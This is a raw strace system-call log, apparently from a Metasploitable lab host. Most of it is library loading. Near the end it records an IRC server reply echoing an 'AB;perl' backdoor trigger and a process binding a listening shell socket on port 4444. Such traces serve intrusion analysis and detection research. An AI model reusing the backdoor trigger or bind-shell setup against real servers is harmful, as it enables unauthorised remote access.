12269 07:41:34.974238 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12269 07:41:34.974306 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974324 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12269 07:41:34.974349 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974366 stat64("/lib/tls/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974382 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974399 stat64("/lib/tls/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974415 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974432 stat64("/lib/tls/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974447 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974464 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12269 07:41:34.974489 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974506 stat64("/lib/i686/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974522 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974539 stat64("/lib/i686/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974554 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974571 stat64("/lib/i686/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974586 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974603 stat64("/lib/i686", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974618 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974635 stat64("/lib/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974650 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974667 stat64("/lib/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974682 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974698 stat64("/lib/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974714 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974738 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12269 07:41:34.974763 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974782 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974798 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974816 stat64("/usr/lib/tls/i686/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974833 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974850 stat64("/usr/lib/tls/i686/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974863 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974876 stat64("/usr/lib/tls/i686", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974887 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974904 stat64("/usr/lib/tls/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974915 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974928 stat64("/usr/lib/tls/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974939 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974951 stat64("/usr/lib/tls/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974963 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974974 stat64("/usr/lib/tls", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.974986 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.974999 stat64("/usr/lib/i686/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975010 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975023 stat64("/usr/lib/i686/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975034 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975047 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12269 07:41:34.975064 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975076 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12269 07:41:34.975093 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975106 stat64("/usr/lib/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975117 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975130 stat64("/usr/lib/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975140 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975153 stat64("/usr/lib/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975164 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975175 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
12269 07:41:34.975192 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975206 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975218 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975244 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975257 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975270 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975282 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975295 stat64("/lib/i486-linux-gnu/tls/i686", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975307 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975320 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975332 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975345 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975357 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975370 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975385 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975398 stat64("/lib/i486-linux-gnu/tls", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975410 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975423 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975435 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975448 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975460 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975474 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975486 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975498 stat64("/lib/i486-linux-gnu/i686", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975510 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975523 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975535 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975547 stat64("/lib/i486-linux-gnu/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975559 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975571 stat64("/lib/i486-linux-gnu/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975583 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975595 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12269 07:41:34.975613 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975627 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975640 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975654 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975666 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975679 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975692 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975705 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975722 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975738 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975751 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975764 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975776 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975789 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975801 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975814 stat64("/usr/lib/i486-linux-gnu/tls", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975829 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975843 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975855 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975869 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975881 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975894 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975906 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975919 stat64("/usr/lib/i486-linux-gnu/i686", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975931 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975944 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975956 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975969 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.975981 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.975994 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbf9c065c) = -1 ENOENT (No such file or directory)
12269 07:41:34.976006 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12269 07:41:34.976019 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12269 07:41:34.976038 munmap(0xb7d10000, 29913) = 0
12269 07:41:34.976059 open("/etc/ld.so.cache", O_RDONLY) = 6
12269 07:41:34.976072 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12269 07:41:34.976088 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d10000
12269 07:41:34.976099 close(6)          = 0
12269 07:41:34.976109 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12269 07:41:34.976124 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
12269 07:41:34.976139 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12269 07:41:34.976238 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
12269 07:41:34.976261 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d05000
12269 07:41:34.976274 mmap2(0xb7d0e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d0e000
12269 07:41:34.976291 close(6)          = 0
12269 07:41:34.976314 munmap(0xb7d10000, 29913) = 0
12269 07:41:34.976331 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
12269 07:41:34.976350 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
12269 07:41:34.976366 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
12269 07:41:34.976383 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d17000
12269 07:41:34.976394 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
12269 07:41:34.976582 close(6)          = 0
12269 07:41:34.976593 munmap(0xb7d17000, 4096) = 0
12269 07:41:34.976611 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
12269 07:41:34.976625 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
12269 07:41:34.976641 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d17000
12269 07:41:34.976651 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
12269 07:41:34.976875 close(6)          = 0
12269 07:41:34.976885 munmap(0xb7d17000, 4096) = 0
12269 07:41:34.976913 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
12269 07:41:34.976935 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0b68) = -1 EINVAL (Invalid argument)
12269 07:41:34.976949 _llseek(6, 0, 0xbf9c0bb0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12269 07:41:34.976962 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0b68) = -1 EINVAL (Invalid argument)
12269 07:41:34.976973 _llseek(6, 0, 0xbf9c0bb0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12269 07:41:34.976983 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
12269 07:41:34.977039 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
12269 07:41:34.977074 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
12269 07:41:34.977099 listen(6, 5)      = 0
12269 07:41:34.977154 accept(6,  <unfinished ...>
12268 07:41:34.993545 exit_group(0)     = ?
12266 07:41:34.993624 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 12268
12266 07:41:34.993641 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12266 07:41:34.993653 --- SIGCHLD (Child exited) @ 0 (0) ---
12266 07:41:34.993661 waitpid(-1, 0xbf89fc18, WNOHANG) = -1 ECHILD (No child processes)
12266 07:41:34.993672 sigreturn()       = ? (mask now [])
12266 07:41:34.993688 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12266 07:41:34.993731 exit_group(0)     = ?
4519  07:41:34.993767 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 12266
4519  07:41:34.993779 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:41:34.993804 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:41:34.993816 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:41:34.993825 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:41:34.993844 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:41:34.993912 time(NULL)        = 1495626094
4519  07:41:34.993929 time(NULL)        = 1495626094
4519  07:41:34.993942 gettimeofday({1495626094, 993947}, NULL) = 0
4519  07:41:34.993956 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:41:34.993987 clock_gettime(CLOCK_MONOTONIC, {2904, 811000177}) = 0
4519  07:41:34.994000 gettimeofday({1495626094, 994004}, NULL) = 0
4519  07:41:34.994011 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {1, 0})
4519  07:41:34.994052 clock_gettime(CLOCK_MONOTONIC, {2904, 811064804}) = 0
4519  07:41:34.994064 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:41:34.994090 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 550000}, ...}) = 0
